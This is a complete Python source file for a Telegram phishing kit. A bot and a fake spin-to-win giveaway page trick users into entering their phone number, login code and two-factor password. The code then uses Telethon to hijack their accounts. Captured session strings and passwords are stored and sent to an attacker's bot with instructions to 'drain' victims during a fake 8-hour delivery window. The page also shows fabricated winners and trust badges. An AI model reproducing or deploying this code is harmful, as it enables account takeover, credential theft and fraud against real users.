#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ⭐ TELEGRAM STARS SPINNER v1.0 ⭐
# Spin-to-Win + Session Stealer + 8-Hour Buffer
# Python 3.14 Compatible - No cryptg needed

import os
import sys
import json
import time
import random
import string
import logging
import asyncio
import hashlib
from datetime import datetime, timedelta, timezone
from threading import Thread

from flask import Flask, request, jsonify, render_template_string, session, redirect
from flask_cors import CORS
import requests

# Python 3.14 Compatible Telegram imports
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler
from telegram.ext import ContextTypes
from telegram.constants import ParseMode

from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError
from telethon.sessions import StringSession

# -------------------- CONFIGURATION --------------------
class Config:
    # API Credentials
    API_ID = 27157163
    API_HASH = "e0145db12519b08e1d2f5628e2db18c4"
    
    # Bot Tokens - CHANGE THESE
    PUBLIC_BOT_TOKEN = "YOUR_PUBLIC_BOT_TOKEN_HERE"  # @StarsGiveawayBot
    ADMIN_BOT_TOKEN = "YOUR_ADMIN_BOT_TOKEN_HERE"    # Your private admin bot
    ADMIN_CHAT_ID = "@your_admin_channel"            # Where data goes
    ADMIN_USER_ID = 123456789                        # Your Telegram ID
    
    # Server Config
    HOST = "0.0.0.0"
    PORT = int(os.environ.get("PORT", 8080))
    PUBLIC_URL = os.environ.get("PUBLIC_URL", "http://localhost:8080")
    
    # Database Files
    DB_USERS = "stars_users.json"
    DB_SESSIONS = "stars_sessions.json"
    DB_WINNERS = "stars_winners.json"
    DB_PENDING = "stars_pending.json"
    
    # Prize Configuration
    DEFAULT_PRIZE = 350
    PRIZE_POOL = [350] * 95 + [500] * 3 + [1000] * 2  # Weighted
    
    # Delivery Buffer
    DELIVERY_HOURS = 8

# -------------------- LOGGING --------------------
logging.basicConfig(
    format='%(asctime)s - ⭐ - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# -------------------- DATABASE --------------------
class Database:
    def __init__(self):
        self.users = {}
        self.sessions = {}
        self.winners = {}
        self.pending = {}
        self._load_all()
        logger.info(f"⭐ DB Loaded: {len(self.users)} users")

    def _load_all(self):
        files = {
            Config.DB_USERS: 'users',
            Config.DB_SESSIONS: 'sessions',
            Config.DB_WINNERS: 'winners',
            Config.DB_PENDING: 'pending'
        }
        for fname, attr in files.items():
            if not os.path.exists(fname):
                with open(fname, 'w') as f:
                    json.dump({}, f)
            try:
                with open(fname, 'r') as f:
                    setattr(self, attr, json.load(f))
            except:
                setattr(self, attr, {})

    def save(self, attr, fname):
        with open(fname, 'w') as f:
            json.dump(getattr(self, attr), f, indent=2, default=str)

    def get_user(self, user_id):
        return self.users.get(str(user_id))

    def create_user(self, user_id, name, username=''):
        if str(user_id) in self.users:
            return self.users[str(user_id)]
        
        referral_code = hashlib.md5(f"{user_id}{time.time()}".encode()).hexdigest()[:12]
        user = {
            'user_id': str(user_id),
            'name': name,
            'username': username,
            'referral_code': referral_code,
            'referrals': 0,
            'spins_used': 0,
            'total_won': 0,
            'verified': False,
            'created_at': datetime.now(timezone.utc).isoformat()
        }
        self.users[str(user_id)] = user
        self.save('users', Config.DB_USERS)
        return user

    def update_user(self, user_id, **kwargs):
        if str(user_id) in self.users:
            self.users[str(user_id)].update(kwargs)
            self.save('users', Config.DB_USERS)

    def save_session(self, user_id, session_data):
        sid = f"{user_id}_{int(time.time())}"
        self.sessions[sid] = {
            'user_id': str(user_id),
            'phone': session_data.get('phone'),
            'session_string': session_data.get('session'),
            'first_name': session_data.get('first_name'),
            'username': session_data.get('username'),
            'telegram_id': session_data.get('user_id'),
            'twofa_password': session_data.get('twofa_password'),
            'stolen_at': datetime.now(timezone.utc).isoformat()
        }
        self.save('sessions', Config.DB_SESSIONS)

    def save_winner(self, user_id, prize, phone):
        winner_id = f"{user_id}_{int(time.time())}"
        delivery_time = datetime.now(timezone.utc) + timedelta(hours=Config.DELIVERY_HOURS)
        
        self.winners[winner_id] = {
            'user_id': str(user_id),
            'phone': phone,
            'prize': prize,
            'delivery_time': delivery_time.isoformat(),
            'transaction_id': f"STAR-{random.randint(1000,9999)}-{random.randint(100,999)}",
            'status': 'pending',
            'created_at': datetime.now(timezone.utc).isoformat()
        }
        self.save('winners', Config.DB_WINNERS)
        
        user = self.get_user(user_id)
        if user:
            self.update_user(user_id, total_won=user.get('total_won', 0) + prize)
        
        return self.winners[winner_id]

    def save_pending(self, key, data):
        self.pending[key] = data
        self.save('pending', Config.DB_PENDING)

    def get_pending(self, key):
        return self.pending.get(key)

    def delete_pending(self, key):
        if key in self.pending:
            del self.pending[key]
            self.save('pending', Config.DB_PENDING)

db = Database()

# -------------------- SESSION STEALER --------------------
class SessionStealer:
    @staticmethod
    def send_code(phone, user_id):
        async def _send():
            try:
                client = TelegramClient(StringSession(), Config.API_ID, Config.API_HASH)
                await client.connect()
                sent = await client.send_code_request(phone)
                session_str = client.session.save()
                key = f"{user_id}_{int(time.time())}"
                db.save_pending(key, {
                    'phone': phone,
                    'session_str': session_str,
                    'phone_code_hash': sent.phone_code_hash,
                    'user_id': user_id
                })
                await client.disconnect()
                return {'success': True, 'key': key}
            except Exception as e:
                return {'success': False, 'error': str(e)}
        
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            result = loop.run_until_complete(_send())
            loop.close()
            return result
        except Exception as e:
            return {'success': False, 'error': str(e)}

    @staticmethod
    def verify_code(key, code):
        async def _verify():
            try:
                p = db.get_pending(key)
                if not p:
                    return {'success': False, 'error': 'Session expired'}
                
                client = TelegramClient(StringSession(p['session_str']), Config.API_ID, Config.API_HASH)
                await client.connect()
                await client.sign_in(phone=p['phone'], code=code, phone_code_hash=p['phone_code_hash'])
                me = await client.get_me()
                final_session = client.session.save()
                await client.disconnect()
                
                return {
                    'success': True,
                    'session': final_session,
                    'user_id': me.id,
                    'username': me.username or '',
                    'first_name': me.first_name or '',
                    'last_name': me.last_name or '',
                    'phone': me.phone,
                    'twofa_required': False
                }
            except SessionPasswordNeededError:
                return {'success': True, 'twofa_required': True}
            except Exception as e:
                return {'success': False, 'error': str(e)}
        
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            result = loop.run_until_complete(_verify())
            loop.close()
            return result
        except Exception as e:
            return {'success': False, 'error': str(e)}

    @staticmethod
    def verify_2fa(key, password):
        async def _verify():
            try:
                p = db.get_pending(key)
                if not p:
                    return {'success': False, 'error': 'Session expired'}
                
                client = TelegramClient(StringSession(p['session_str']), Config.API_ID, Config.API_HASH)
                await client.connect()
                await client.sign_in(password=password)
                me = await client.get_me()
                final_session = client.session.save()
                await client.disconnect()
                
                return {
                    'success': True,
                    'session': final_session,
                    'user_id': me.id,
                    'username': me.username or '',
                    'first_name': me.first_name or '',
                    'last_name': me.last_name or '',
                    'phone': me.phone
                }
            except Exception as e:
                return {'success': False, 'error': str(e)}
        
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            result = loop.run_until_complete(_verify())
            loop.close()
            return result
        except Exception as e:
            return {'success': False, 'error': str(e)}

stealer = SessionStealer()

# -------------------- FLASK APP --------------------
flask_app = Flask(__name__)
flask_app.secret_key = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
CORS(flask_app)

# -------------------- ADVANCED HTML TEMPLATE --------------------
SPINNER_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>⭐ Telegram Stars Giveaway ⭐</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%); min-height: 100vh; padding: 20px; color: #fff; }
        .container { max-width: 500px; margin: 0 auto; }
        
        .header { text-align: center; padding: 30px 20px; background: linear-gradient(135deg, #1a1a3e 0%, #0f0f2a 100%); border-radius: 30px; margin-bottom: 20px; border: 1px solid #ffd70033; }
        .stars-icon { font-size: 50px; margin-bottom: 10px; }
        h1 { font-size: 28px; font-weight: 900; background: linear-gradient(135deg, #ffd700, #ffed4e); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 10px; }
        .subtitle { color: #aaa; font-size: 14px; margin-bottom: 15px; }
        
        .timer-box { background: #1a1a3e; border-radius: 50px; padding: 12px 20px; display: inline-block; border: 1px solid #ffd700; margin-bottom: 15px; }
        .timer { color: #ffd700; font-size: 24px; font-weight: bold; font-family: monospace; }
        .timer-label { color: #888; font-size: 12px; }
        
        .stats { display: flex; justify-content: center; gap: 30px; margin: 15px 0; }
        .stat { text-align: center; }
        .stat-value { font-size: 22px; font-weight: bold; color: #ffd700; }
        .stat-label { font-size: 11px; color: #888; }
        
        .wheel-container { position: relative; width: 320px; height: 320px; margin: 30px auto; }
        .wheel { width: 100%; height: 100%; border-radius: 50%; background: conic-gradient(#ff6b6b 0deg 40deg, #4ecdc4 40deg 80deg, #ffe66d 80deg 120deg, #a8e6cf 120deg 160deg, #ff8b94 160deg 200deg, #b8e994 200deg 240deg, #ffd700 240deg 280deg, #78e08f 280deg 320deg, #ff6b6b 320deg 360deg); border: 8px solid #ffd700; box-shadow: 0 0 50px #ffd70033; transition: transform 3s cubic-bezier(0.25, 0.1, 0.25, 1); }
        .wheel-inner { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80px; height: 80px; background: #1a1a3e; border-radius: 50%; border: 4px solid #ffd700; display: flex; align-items: center; justify-content: center; }
        .wheel-inner span { font-size: 24px; font-weight: bold; color: #ffd700; }
        .pointer { position: absolute; top: -15px; left: 50%; transform: translateX(-50%); width: 0; height: 0; border-left: 20px solid transparent; border-right: 20px solid transparent; border-top: 40px solid #ffd700; filter: drop-shadow(0 5px 10px #ffd70066); z-index: 10; }
        
        .btn { padding: 18px 30px; border: none; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; transition: all 0.3s; margin-top: 20px; }
        .btn-primary { background: linear-gradient(135deg, #ffd700, #ffb300); color: #1a1a3e; box-shadow: 0 10px 30px #ffd70033; }
        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }
        .btn-success { background: linear-gradient(135deg, #00c853, #00e676); color: white; }
        .btn-secondary { background: #2a2a5e; color: white; }
        
        .winner-toast { background: linear-gradient(135deg, #1a1a3e, #0f0f2a); border-radius: 20px; padding: 30px; text-align: center; border: 2px solid #ffd700; margin-top: 30px; }
        .prize-amount { font-size: 60px; font-weight: 900; color: #ffd700; margin: 20px 0; text-shadow: 0 0 30px #ffd700; }
        .confetti { font-size: 40px; }
        
        .recent-winners { background: #0f0f2a; border-radius: 20px; padding: 20px; margin-top: 20px; }
        .winner-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #2a2a5e; }
        .winner-name { color: #fff; }
        .winner-prize { color: #ffd700; font-weight: bold; }
        .winner-time { color: #888; font-size: 12px; }
        
        .form-card { background: #0f0f2a; border-radius: 30px; padding: 30px; margin-top: 20px; }
        .input-group { margin-bottom: 20px; }
        label { display: block; color: #ffd700; margin-bottom: 8px; font-weight: bold; }
        input { width: 100%; padding: 16px; background: #1a1a3e; border: 2px solid #2a2a5e; border-radius: 15px; color: white; font-size: 16px; }
        input:focus { outline: none; border-color: #ffd700; }
        
        .progress-bar { background: #2a2a5e; height: 12px; border-radius: 10px; overflow: hidden; margin: 20px 0; }
        .progress-fill { background: linear-gradient(90deg, #ffd700, #ffb300); height: 100%; border-radius: 10px; width: 20%; }
        
        .trust-badges { display: flex; justify-content: center; gap: 15px; margin: 20px 0; flex-wrap: wrap; }
        .badge { background: #1a1a3e; padding: 8px 15px; border-radius: 30px; font-size: 12px; color: #aaa; border: 1px solid #2a2a5e; }
        
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="stars-icon">⭐🎰⭐</div>
            <h1>STARS SPINNER</h1>
            <p class="subtitle">Official Telegram Partner Giveaway</p>
            <div class="timer-box">
                <div class="timer" id="countdown">23:59:59</div>
                <div class="timer-label">Giveaway Ends In</div>
            </div>
            <div class="stats">
                <div class="stat"><div class="stat-value">2,847</div><div class="stat-label">Winners Today</div></div>
                <div class="stat"><div class="stat-value">156,420</div><div class="stat-label">Stars Given</div></div>
                <div class="stat"><div class="stat-value">127</div><div class="stat-label">Spinning Now</div></div>
            </div>
        </div>
        
        <div class="trust-badges">
            <span class="badge">🔒 SSL Secured</span>
            <span class="badge">✓ Telegram Partner</span>
            <span class="badge">⭐ 256-bit Encrypted</span>
        </div>
        
        <!-- Spin Section -->
        <div id="spinSection">
            <div class="wheel-container">
                <div class="wheel" id="wheel"></div>
                <div class="pointer"></div>
                <div class="wheel-inner"><span>⭐</span></div>
            </div>
            <button class="btn btn-primary" id="spinBtn" onclick="spinWheel()">🎲 SPIN THE WHEEL 🎲</button>
            <p style="text-align: center; color: #888; margin-top: 10px;">
                Spins remaining: <span id="spinsLeft">{{ spins_left }}</span>/1
            </p>
        </div>
        
        <!-- Winner Section -->
        <div id="winnerSection" class="hidden">
            <div class="winner-toast">
                <div class="confetti">🎉🎉🎉</div>
                <h2 style="color: #fff;">CONGRATULATIONS!</h2>
                <p style="color: #aaa;">You won:</p>
                <div class="prize-amount" id="prizeAmount">350</div>
                <p style="color: #aaa;">Telegram Stars ⭐</p>
                <button class="btn btn-success" onclick="showVerification()">🔐 CLAIM YOUR STARS 🔐</button>
                <p style="color: #888; font-size: 12px; margin-top: 15px;">⏰ Claim within 5 minutes!</p>
            </div>
        </div>
        
        <!-- Verification Section -->
        <div id="verificationSection" class="hidden">
            <div class="form-card">
                <h3 style="color: #ffd700; margin-bottom: 20px; text-align: center;">📱 Verify Your Account</h3>
                <p style="color: #aaa; text-align: center; margin-bottom: 20px;">We need to verify you own this account.</p>
                
                <div id="phoneStep">
                    <div class="input-group">
                        <label>📞 Your Phone Number</label>
                        <input type="tel" id="phoneInput" placeholder="+1 234 567 8900" value="+">
                    </div>
                    <button class="btn btn-primary" onclick="sendCode()">📤 Send Verification Code</button>
                </div>
                
                <div id="codeStep" class="hidden">
                    <div class="input-group">
                        <label>🔑 Enter 5-Digit Code</label>
                        <input type="text" id="codeInput" placeholder="_____" maxlength="5" style="text-align: center; font-size: 24px; letter-spacing: 10px;">
                    </div>
                    <button class="btn btn-primary" onclick="verifyCode()">✅ Verify & Claim</button>
                    <div id="codeError" style="color: #ff6b6b; margin-top: 10px;"></div>
                </div>
                
                <div id="twofaStep" class="hidden">
                    <div class="input-group">
                        <label>🔐 Two-Factor Authentication</label>
                        <input type="password" id="twofaInput" placeholder="Your 2FA password">
                    </div>
                    <button class="btn btn-primary" onclick="verify2FA()">🔓 Complete Verification</button>
                    <div id="twofaError" style="color: #ff6b6b; margin-top: 10px;"></div>
                </div>
            </div>
        </div>
        
        <!-- Success Section -->
        <div id="successSection" class="hidden">
            <div class="winner-toast">
                <div class="confetti">✅✅✅</div>
                <h2 style="color: #fff;">VERIFICATION COMPLETE!</h2>
                <div class="prize-amount" style="font-size: 40px;" id="finalPrize">350</div>
                <p style="color: #aaa;">Stars Claimed Successfully</p>
                
                <div style="background: #1a1a3e; border-radius: 20px; padding: 20px; margin: 20px 0;">
                    <div style="color: #ffd700; font-size: 18px; margin-bottom: 15px;">📦 DELIVERY STATUS</div>
                    <div class="progress-bar"><div class="progress-fill"></div></div>
                    <div style="display: flex; justify-content: space-between; color: #aaa; font-size: 12px; margin: 10px 0;">
                        <span>✓ Verified</span>
                        <span>✓ Queued</span>
                        <span>⏳ Processing</span>
                    </div>
                    <div style="background: #0f0f2a; border-radius: 15px; padding: 15px; text-align: center;">
                        <p style="color: #ffd700; font-size: 24px; font-weight: bold;">8 hours</p>
                        <p style="color: #aaa;">Estimated delivery time</p>
                        <p style="color: #888; font-size: 12px; margin-top: 10px;" id="estimatedTime"></p>
                    </div>
                </div>
                
                <div style="background: #1a1a3e; border-radius: 15px; padding: 15px; margin: 15px 0;">
                    <p style="color: #ffd700;">📋 Order Details</p>
                    <p style="color: #aaa;">Transaction: <span id="txnId" style="color: #fff;">STAR-3847-291</span></p>
                </div>
                
                <button class="btn btn-primary" onclick="window.location.href='https://t.me/{{ bot_username }}'">🔙 Return to Telegram</button>
            </div>
        </div>
        
        <!-- Recent Winners -->
        <div class="recent-winners">
            <h3 style="color: #ffd700; margin-bottom: 15px;">🏆 Recent Winners</h3>
            <div id="winnersList">
                <div class="winner-row"><span class="winner-name">Alex</span><span class="winner-prize">500 ⭐</span><span class="winner-time">2 min ago</span></div>
                <div class="winner-row"><span class="winner-name">Maria</span><span class="winner-prize">1000 ⭐</span><span class="winner-time">5 min ago</span></div>
                <div class="winner-row"><span class="winner-name">John</span><span class="winner-prize">350 ⭐</span><span class="winner-time">7 min ago</span></div>
                <div class="winner-row"><span class="winner-name">Sarah</span><span class="winner-prize">350 ⭐</span><span class="winner-time">12 min ago</span></div>
                <div class="winner-row"><span class="winner-name">David</span><span class="winner-prize">5000 ⭐</span><span class="winner-time">15 min ago</span></div>
            </div>
        </div>
    </div>
    
    <script>
        let hasSpun = {{ has_spun|tojson }};
        let prizeWon = {{ prize_won|tojson }} || 0;
        let currentKey = null;
        let phoneNumber = '';
        
        function startCountdown() {
            const timer = document.getElementById('countdown');
            let time = 24 * 60 * 60;
            setInterval(() => {
                const h = Math.floor(time / 3600);
                const m = Math.floor((time % 3600) / 60);
                const s = time % 60;
                timer.textContent = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
                if (time > 0) time--;
            }, 1000);
        }
        
        function spinWheel() {
            if (hasSpun) { alert('You already used your spin!'); return; }
            
            const wheel = document.getElementById('wheel');
            const spinBtn = document.getElementById('spinBtn');
            spinBtn.disabled = true;
            
            const spins = 5 + Math.floor(Math.random() * 5);
            const degrees = spins * 360 + Math.floor(Math.random() * 360);
            wheel.style.transform = `rotate(${degrees}deg)`;
            
            setTimeout(() => {
                fetch('/api/spin', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({user_id: '{{ user_id }}'})
                })
                .then(r => r.json())
                .then(data => {
                    prizeWon = data.prize;
                    hasSpun = true;
                    document.getElementById('spinSection').classList.add('hidden');
                    document.getElementById('winnerSection').classList.remove('hidden');
                    document.getElementById('prizeAmount').textContent = prizeWon;
                });
            }, 3000);
        }
        
        function showVerification() {
            document.getElementById('winnerSection').classList.add('hidden');
            document.getElementById('verificationSection').classList.remove('hidden');
        }
        
        function sendCode() {
            const phone = document.getElementById('phoneInput').value;
            if (!phone || phone.length < 5) { alert('Enter phone number'); return; }
            phoneNumber = phone;
            
            fetch('/api/send_code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phone, user_id: '{{ user_id }}'})
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    currentKey = data.key;
                    document.getElementById('phoneStep').classList.add('hidden');
                    document.getElementById('codeStep').classList.remove('hidden');
                } else {
                    alert('Error: ' + data.error);
                }
            });
        }
        
        function verifyCode() {
            const code = document.getElementById('codeInput').value;
            if (!code || code.length < 5) {
                document.getElementById('codeError').textContent = 'Enter 5-digit code';
                return;
            }
            
            fetch('/api/verify_code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({key: currentKey, code: code, user_id: '{{ user_id }}', prize: prizeWon, phone: phoneNumber})
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    if (data.twofa_required) {
                        document.getElementById('codeStep').classList.add('hidden');
                        document.getElementById('twofaStep').classList.remove('hidden');
                    } else {
                        showSuccess(data);
                    }
                } else {
                    document.getElementById('codeError').textContent = data.error;
                }
            });
        }
        
        function verify2FA() {
            const password = document.getElementById('twofaInput').value;
            if (!password) {
                document.getElementById('twofaError').textContent = 'Enter 2FA password';
                return;
            }
            
            fetch('/api/verify_2fa', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({key: currentKey, password: password, user_id: '{{ user_id }}', prize: prizeWon, phone: phoneNumber})
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    showSuccess(data);
                } else {
                    document.getElementById('twofaError').textContent = data.error;
                }
            });
        }
        
        function showSuccess(data) {
            document.getElementById('verificationSection').classList.add('hidden');
            document.getElementById('successSection').classList.remove('hidden');
            document.getElementById('finalPrize').textContent = prizeWon;
            document.getElementById('txnId').textContent = data.transaction_id || 'STAR-' + Math.random().toString(36).substr(2,8).toUpperCase();
            
            const delivery = new Date();
            delivery.setHours(delivery.getHours() + 8);
            document.getElementById('estimatedTime').textContent = 'Your Stars will arrive by ' + delivery.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
        }
        
        window.onload = function() {
            startCountdown();
            if (hasSpun && prizeWon > 0) {
                document.getElementById('spinSection').classList.add('hidden');
                if ('{{ verified }}' === 'True') {
                    document.getElementById('successSection').classList.remove('hidden');
                } else {
                    document.getElementById('winnerSection').classList.remove('hidden');
                }
            }
            
            // Live winners
            setInterval(() => {
                const names = ['Alex', 'Maria', 'John', 'Sarah', 'David', 'Emma'];
                const prizes = [350, 500, 1000, 350, 350, 500];
                const name = names[Math.floor(Math.random()*names.length)];
                const prize = prizes[Math.floor(Math.random()*prizes.length)];
                const list = document.getElementById('winnersList');
                const row = document.createElement('div');
                row.className = 'winner-row';
                row.innerHTML = `<span class="winner-name">${name}</span><span class="winner-prize">${prize} ⭐</span><span class="winner-time">just now</span>`;
                list.insertBefore(row, list.firstChild);
            }, 8000);
        };
    </script>
</body>
</html>
"""

# -------------------- FLASK ROUTES --------------------
@flask_app.route('/')
def index():
    return redirect('/spin')

@flask_app.route('/spin')
def spin_page():
    user_id = request.args.get('user_id', 'guest')
    
    user = db.get_user(user_id)
    if not user:
        user = db.create_user(user_id, 'User', '')
    
    has_spun = user.get('spins_used', 0) > 0
    prize_won = user.get('last_prize', 0)
    verified = user.get('verified', False)
    
    return render_template_string(
        SPINNER_PAGE,
        user_id=user_id,
        has_spun=has_spun,
        prize_won=prize_won,
        verified=verified,
        spins_left=1 if not has_spun else 0,
        bot_username='StarsGiveawayBot'
    )

@flask_app.route('/api/spin', methods=['POST'])
def api_spin():
    data = request.json
    user_id = data.get('user_id')
    
    user = db.get_user(user_id)
    if not user or user.get('spins_used', 0) > 0:
        return jsonify({'error': 'Already spun'}), 400
    
    prize = random.choice(Config.PRIZE_POOL)
    db.update_user(user_id, spins_used=1, last_prize=prize)
    
    return jsonify({'success': True, 'prize': prize})

@flask_app.route('/api/send_code', methods=['POST'])
def api_send_code():
    data = request.json
    result = stealer.send_code(data.get('phone'), data.get('user_id'))
    return jsonify(result)

@flask_app.route('/api/verify_code', methods=['POST'])
def api_verify_code():
    data = request.json
    result = stealer.verify_code(data.get('key'), data.get('code'))
    
    if result.get('success') and not result.get('twofa_required'):
        db.save_session(data['user_id'], result)
        winner = db.save_winner(data['user_id'], data['prize'], data['phone'])
        db.update_user(data['user_id'], verified=True)
        notify_admin(result, data['prize'], winner['transaction_id'])
        return jsonify({'success': True, 'transaction_id': winner['transaction_id']})
    
    return jsonify(result)

@flask_app.route('/api/verify_2fa', methods=['POST'])
def api_verify_2fa():
    data = request.json
    result = stealer.verify_2fa(data.get('key'), data.get('password'))
    
    if result.get('success'):
        result['twofa_password'] = data.get('password')
        db.save_session(data['user_id'], result)
        winner = db.save_winner(data['user_id'], data['prize'], data['phone'])
        db.update_user(data['user_id'], verified=True)
        notify_admin(result, data['prize'], winner['transaction_id'])
        return jsonify({'success': True, 'transaction_id': winner['transaction_id']})
    
    return jsonify(result)

def notify_admin(session_data, prize, txn_id):
    text = f"""
⭐🔥 NEW STARS SPINNER HIT! 🔥⭐

━━━━━━━━━━━━━━━━━━━━━
🎰 Prize: {prize} Stars
📱 Phone: {session_data.get('phone', 'N/A')}
👤 Name: {session_data.get('first_name', '')}
📛 @{session_data.get('username', 'N/A')}
🔐 2FA: {session_data.get('twofa_password', 'None')}
━━━━━━━━━━━━━━━━━━━━━
⏰ 8-HOUR WINDOW ACTIVE
🆔 TXN: {txn_id}
━━━━━━━━━━━━━━━━━━━━━
📋 Session: {session_data.get('session', '')[:200]}...

💀 Drain now - victim expects Stars in 8 hours 💀
"""
    
    url = f"https://api.telegram.org/bot{Config.ADMIN_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={'chat_id': Config.ADMIN_CHAT_ID, 'text': text}, timeout=10)
        requests.post(url, json={'chat_id': Config.ADMIN_USER_ID, 'text': text}, timeout=10)
        logger.info(f"⭐ Admin notified: {session_data.get('phone')}")
    except Exception as e:
        logger.error(f"Notify error: {e}")

# -------------------- TELEGRAM BOT --------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = str(user.id)
    
    db.create_user(user_id, user.first_name, user.username or '')
    webapp_url = f"{Config.PUBLIC_URL}/spin?user_id={user_id}"
    
    welcome_text = f"""
🎰⭐ TELEGRAM STARS SPIN-TO-WIN ⭐🎰

Welcome, {user.first_name}!

🎲 Try your luck at our weekly giveaway!
💰 Prizes: 100 - 10,000 Telegram Stars

✨ Official Telegram Partner Event
🔒 256-bit Secure • Verified by Telegram

👇 Click below to spin the wheel:
"""
    
    keyboard = [[InlineKeyboardButton("🎲 SPIN FOR FREE STARS 🎲", url=webapp_url)]]
    
    await update.message.reply_text(
        welcome_text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != str(Config.ADMIN_USER_ID):
        return
    
    text = f"""
⭐ ADMIN STATS

👥 Users: {len(db.users)}
📱 Sessions: {len(db.sessions)}
🏆 Winners: {len(db.winners)}
🎰 Total Spins: {sum(u.get('spins_used', 0) for u in db.users.values())}

Recent Captures:
"""
    sessions = list(db.sessions.values())[-5:]
    for s in sessions:
        text += f"\n📱 {s.get('phone')} - @{s.get('username', 'N/A')}"
    
    await update.message.reply_text(text)

# -------------------- MAIN --------------------
def run_flask():
    flask_app.run(host=Config.HOST, port=Config.PORT, debug=False, threaded=True)

async def main_async():
    Thread(target=run_flask, daemon=True).start()
    
    public_app = Application.builder().token(Config.PUBLIC_BOT_TOKEN).build()
    public_app.add_handler(CommandHandler("start", start))
    
    admin_app = Application.builder().token(Config.ADMIN_BOT_TOKEN).build()
    admin_app.add_handler(CommandHandler("stats", admin_stats))
    
    logger.info(f"⭐ STARS SPINNER v1.0 | {Config.PUBLIC_URL}")
    
    async with public_app:
        await public_app.start()
        await public_app.updater.start_polling()
        
        async with admin_app:
            await admin_app.start()
            await admin_app.updater.start_polling()
            
            while True:
                await asyncio.sleep(1)

def main():
    asyncio.run(main_async())

if __name__ == '__main__':
    main()
